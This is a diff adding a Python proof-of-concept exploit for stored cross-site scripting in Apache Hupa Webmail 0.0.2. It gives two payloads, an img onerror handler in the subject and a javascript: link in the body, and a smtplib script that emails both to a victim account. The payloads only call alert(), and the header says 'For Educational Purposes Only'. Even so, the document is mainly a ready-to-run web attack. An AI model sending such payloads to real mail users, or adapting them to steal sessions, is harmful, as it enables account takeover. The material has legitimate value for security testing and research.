@@ -1,0 +1,78 @@
+#!/usr/bin/python
+
+'''
+
+# Exploit Title: Hupa Webmail Stored XSS
+# Date: 14/08/2012
+# Exploit Author: Shai rod (@NightRang3r)
+# Vendor Homepage: http://james.apache.org/hupa/
+# Software Link: http://repo1.maven.org/maven2/org/apache/james/hupa/hupa/0.0.2/hupa-0.0.2.war
+# Version: 0.0.2
+ 
+#Gr33Tz: @aviadgolan , @benhayak, @nirgoldshlager, @roni_bachar
+
+
+About the Application:
+======================
+
+Hupa is an Rich IMAP-based Webmail application written in GWT (Google Web Toolkit).
+Hupa has been entirely written in java to be coherent with the language used in the James project. And It has been a reference of a devloping using GWT good practices (MVP pattern and Unit testing)
+Hupa is a functional and well designed email client, ready for reading, sending and managing messages, but it still lacks of many features email clients nowadays have.
+Hupa Webmail Stored XSS in Subject 
+
+
+
+Vulnerability Description
+=========================
+
+1. Stored XSS in email subject.
+
+XSS Payload: XSS POC<img src='1.jpg'onerror=javascript:alert("XSS")>
+
+Send an email to the victim with the payload in the subject field.
+XSS Will be triggered in message listings (Inbox etc..).
+
+
+2. Stored XSS in e-mail body.
+
+XSS Payload: <a href=javascript:alert("AnotherXSS")>POC MAIL</a>
+
+Send an email to the victim with the payload in the email body, once the user clicks on the url the XSS should be triggered.
+
+'''
+
+import smtplib
+
+print "###############################################"
+print "#      Hupa Webmail 0.0.2 Stored XSS POC      #"
+print "#            Coded by: Shai rod               #"
+print "#               @NightRang3r                  #"
+print "#           http://exploit.co.il              #"
+print "#       For Educational Purposes Only!        #"
+print "###############################################\r\n"
+
+# SETTINGS
+
+sender = "attacker@localhost"
+smtp_login = sender
+smtp_password = "qwe123"
+recipient = "victim@localhost"
+smtp_server  = "192.168.1.10"
+smtp_port = 25
+subject = "Hupa Webmail XSS POC"
+xss_payload = """<img src='1.jpg'onerror=javascript:alert("XSS")>"""
+
+# SEND E-MAIL
+
+print "[*] Sending E-mail to " + recipient + "..."
+msg = ("From: %s\r\nTo: %s\r\nSubject: %s\n"
+       % (sender, ", ".join(recipient), subject + xss_payload) )
+msg += "Content-type: text/html\n\n"
+msg += """<a href=javascript:alert("AnotherXSS")>Click Me, Please...</a>\r\n"""
+server = smtplib.SMTP(smtp_server, smtp_port)
+server.ehlo()
+server.starttls()
+server.login(smtp_login, smtp_password)
+server.sendmail(sender, recipient, msg)
+server.quit()
+print "[+] E-mail sent!"
